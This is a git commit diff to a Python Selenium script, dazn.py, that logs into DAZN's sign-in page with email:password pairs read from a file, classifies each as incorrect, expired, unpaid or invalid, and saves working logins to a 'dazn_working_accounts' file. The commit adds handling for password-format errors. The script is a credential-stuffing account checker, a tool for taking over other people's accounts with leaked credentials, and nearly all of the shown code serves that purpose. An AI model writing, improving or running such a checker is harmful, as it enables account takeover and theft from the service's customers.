79e0795535ad032299a0cd882e64e35fe5974801
g3th <theinkandpen@yahoo.co.uk>
2023-01-16 20:18:44 +0000

    added invalid password errors 	modified:   dazn.py

--- dazn.py
+++ dazn.py
@@ -11,6 +11,7 @@ from pathlib import Path
 header()
 file_directory = str(Path(__file__).parent)+'/dazn'
 page = 'https://www.dazn.com/en-GB/signin'
+error_flag = False
 users = []
 passwords = []
 browser_options = Options()
@@ -22,7 +23,7 @@ with open(file_directory, 'r') as dazn:
 	for line in dazn.readlines():
 			users.append(line.split(':')[0].strip())
 			passwords.append(line.split(':')[1].split(' | ')[0].strip())
-
+			
 index = 0
 while index != len(users):
 	with open('accounts/dazn_working_accounts','a') as account_results:
@@ -31,11 +32,15 @@ while index != len(users):
 			browser = webdriver.Chrome(options = browser_options)
 			browser.set_window_size(500,700)
 			browser.get(page)
-			time.sleep(4)			
+			time.sleep(1)
 			if browser.find_elements(By.XPATH,'//*[@id="onetrust-accept-btn-handler"]'):
 				gdpr_accet_all_button = browser.find_element(By.XPATH,'//*[@id="onetrust-accept-btn-handler"]')
 				gdpr_accet_all_button.click()
-				time.sleep(1)
+				time.sleep(4)
+			if browser.find_elements(By.XPATH,'/html/body/div[3]/div/div[3]/section/header/h1'):
+				pick = browser.find_element(By.XPATH,'/html/body/div[3]/div/div[3]/section/header/h1').text
+				if 'PICK YOUR PLAN' in pick:
+					print(" | {}:{} ---> Expired Account".format(users[index],passwords[index]))					
 			if browser.find_elements(By.XPATH,'//*[@id="root"]/div/div[2]/div/div[4]/div[1]'):
 				geolocked_content_message = browser.find_element_By.xpath('//*[@id="root"]/div/div[2]/div/div[4]/div[1]').text
 				print('\n\nIP: {} | Location: {} '.format(connection_error()[0], connection_error()[1]))
@@ -47,7 +52,14 @@ while index != len(users):
 			email_input_box.send_keys(users[index])
 			password_input_box.send_keys(passwords[index])
 			sign_in_button.click()
-			time.sleep(7)				
+			time.sleep(7)
+			if browser.find_elements(By.XPATH,'//*[@id="password_error"]'):
+				invalid_password = browser.find_element(By.XPATH,'//*[@id="password_error"]').text
+				if 'Your password must contain at least one letter and one digit' in invalid_password:
+					print(" | {}:{} ---> Password is invalid".format(users[index],passwords[index]))
+				if 'is not allowed.' in invalid_password:
+					print(" | {}:{} ---> Password contains invalid characters".format(users[index],passwords[index]))
+				error_flag = True
 			if browser.find_elements(By.XPATH,'/html/body/reach-portal/div[3]/div/div/div/div[1]/span'):			
 				error = browser.find_element(By.XPATH,'/html/body/reach-portal/div[3]/div/div/div/div[1]/span').text				
 				if 'Your email address and/or password are incorrect' in str(error):
@@ -64,11 +76,12 @@ while index != len(users):
 					
 				if 'Finish signing up' in expired_account_text:
 					print(' | {}:{} ---> No Payment Method'.format(users[index],passwords[index]))				
-			else:
+			elif error_flag != True:
 				print(' | {}:{} ---> Success!'.format(users[index],passwords[index]))
 				account_results.write('{}:{} ---> Good Account\n'.format(users[index],passwords[index]))				
-			index +=1				
-		except ElementClickInterceptedException:		
+			index +=1
+			error_flag = False
+		except ElementClickInterceptedException:
 			print(' | Click Intercepted, iteration index was not incremented.')
 		
 		except NoSuchElementException:
@@ -77,4 +90,3 @@ while index != len(users):
 		except InvalidSessionIdException:
 			print('Session terminated unexpectedly.\n')
 			break
-
